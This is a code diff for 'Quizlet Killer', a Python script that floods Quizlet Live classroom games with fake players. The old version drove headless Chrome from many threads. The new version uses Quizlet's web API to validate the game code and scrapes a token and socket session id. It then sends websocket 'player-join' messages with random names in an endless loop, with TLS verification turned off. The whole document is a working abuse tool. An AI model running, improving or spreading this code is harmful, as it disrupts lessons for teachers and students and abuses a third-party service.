@@ -1,17 +1,9 @@
 import requests
-import sys
-import os
-import _thread as thread
-import random
 import asyncio
-from selenium import webdriver
-from selenium import *
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.support.expected_conditions import presence_of_element_located
-requests.packages.urllib3.disable_warnings()
+import websockets
+import random
+import json
+import sys
 class colors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -21,42 +13,43 @@ class colors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-def join(code,name,driver):
-	wait = WebDriverWait(driver, 10)
-	driver.execute_script("window.onbeforeunload = function() {};window.alert = function() {};")
-	driver.get("https://quizlet.com/live")
-	try:
-		wait.until(EC.visibility_of_element_located((By.XPATH,"//*[@id=\"LiveGameTarget\"]/div/div/form/div[2]/div/div/div/div[1]/label[1]/div/input")))
-		driver.find_element_by_xpath("//*[@id=\"LiveGameTarget\"]/div/div/form/div[2]/div/div/div/div[1]/label[1]/div/input").send_keys(str(code) + Keys.RETURN)
-	except:
-		wait.until(EC.visibility_of_element_located((By.XPATH,"//*[@id=\"LiveGameTarget\"]/div/div/form/div[2]/div/div/div/div[1]/label[1]/div/input")))
-		driver.find_element_by_xpath("//*[@id=\"LiveGameTarget\"]/div/div/form/div[2]/div/div/div/div[1]/label[1]/div/input").send_keys(str(code) + Keys.RETURN)
-	try:
-		wait.until(EC.visibility_of_element_located((By.XPATH,"//*[@id=\"LiveGameTarget\"]/div/div/form/div[2]/div/label/div/input")))
-		driver.find_element_by_xpath("//*[@id=\"LiveGameTarget\"]/div/div/form/div[2]/div/label/div/input").send_keys(name + Keys.RETURN)
-	except:
-		print(colors.FAIL,"[x]Could not join this game. Your code is probably invalid. Ask Your teacher or use brute-force.",colors.ENDC)
-		os._exit(1)
-	finally:
-		wait.until(EC.visibility_of_element_located((By.CLASS_NAME,"StudentInstructionsView")))
-		print(colors.OKGREEN,"[+]Joined game",code,"with random fake name.",colors.ENDC)
-		driver.close()
-def loop():
-	options = webdriver.ChromeOptions()
-	options.add_argument("--incognito")
-	options.add_argument('--disable-notifications')
-	options.add_argument('--disable-extensions')
-	options.add_argument('--headless')
-	options.add_argument('--log-level=3')
-	for i in range (1000):
-		join(code,"Quizlet killer by PT #"+str(random.randint(0,10000)),webdriver.Chrome("chromedriver.exe",options=options))
-print(colors.HEADER,"[i]Welcome to Quizlet Killer! Enter game code:",colors.ENDC)
-code=input()
-print(colors.HEADER,"[i]Please enter number of attack threads (too high number may freeze your machine)",colors.ENDC)
-threads=int(input())
-print(colors.HEADER,"[i]Quizlet killer attack is in progress. Press CTRL+C to stop.",colors.ENDC)
-sys.tracebacklimit = 0
-for i in range(threads):
-	thread.start_new_thread(loop,())
+requests.packages.urllib3.disable_warnings()
+def testCode(code):
+	instanceEndpoint = "https://quizlet.com/webapi/3.2/game-instances?filters={\"gameCode\":\""+code+"\",\"isInProgress\":\"true\",\"isDeleted\":\"false\"}"
+	r=requests.get(instanceEndpoint,verify=False)
+	return("\"total\":0" not in r.text)
+def getToken():
+	tokenEndpoint="https://quizlet.com/live"
+	r=requests.get(tokenEndpoint,verify=False)
+	return(r.text[r.text.find("\"multiplayerToken\":\""):r.text.find(",\"personId\""):].split(":")[1][1:-1])
+def getSession(code,token):
+	sidEndpoint = "https://quizlet.com/multiplayer/3/45413/"+code+"/games/socket/?gameId="+code+"&token="+token+"&EIO=3&transport=polling&t=M-Gll4B"
+	r=requests.get(sidEndpoint,verify=False)
+	return(r.text[r.text.find("\"sid\":\""):r.text.find(",\"upgrades\"")].split(":")[1][1:-1])
+def getAnswers(code,token,sid):
+	termsEndpoint = "https://quizlet.com/multiplayer/3/45413/"+code+"/games/socket/?gameId="+code+"&token="+token+"&EIO=3&transport=polling&t=M-Gll4B&sid="+sid
+	r=requests.get(termsEndpoint,verify=False)
+	plain=r.text[r.text.find("[")::]
+	return(json.loads(plain))
+async def join(code,token,sid,name):
+	wsUri="wss://quizlet.com/multiplayer/3/45413/"+code+"/games/socket/?gameId="+code+"&token="+token+"&EIO=3&transport=websocket&sid="+sid
+	async with websockets.connect(wsUri) as websocket:
+		await websocket.send("2probe")
+		await websocket.recv()
+		await websocket.send("5")
+		await websocket.send("42[\"player-join\",{\"username\":\""+name+"\",\"image\":\"https://p0.piqsels.com/preview/998/626/353/imagination-brain-key-head.jpg\"}]")
+		data=await websocket.recv()
+print("Enter PIN:")
+code=str(input())
+if(testCode(code)):
+		print(colors.OKGREEN,"[+]Code is valid:",code,colors.ENDC)
+else:
+		print(colors.FAIL,"[-]Code is invalid:",code,colors.ENDC)
+		sys.exit()
+print(colors.OKBLUE,"[i]Starting spam, press CTRL+C to stop",colors.ENDC)
 while(1):
-	pass
+	token=getToken()
+	sid=getSession(code,token)
+	name="Quizlet killer #"+str(random.randint(0,999999))
+	asyncio.get_event_loop().run_until_complete(join(code,token,sid,name))
+	print(colors.OKGREEN,"[+]Joined as:",name,colors.ENDC)
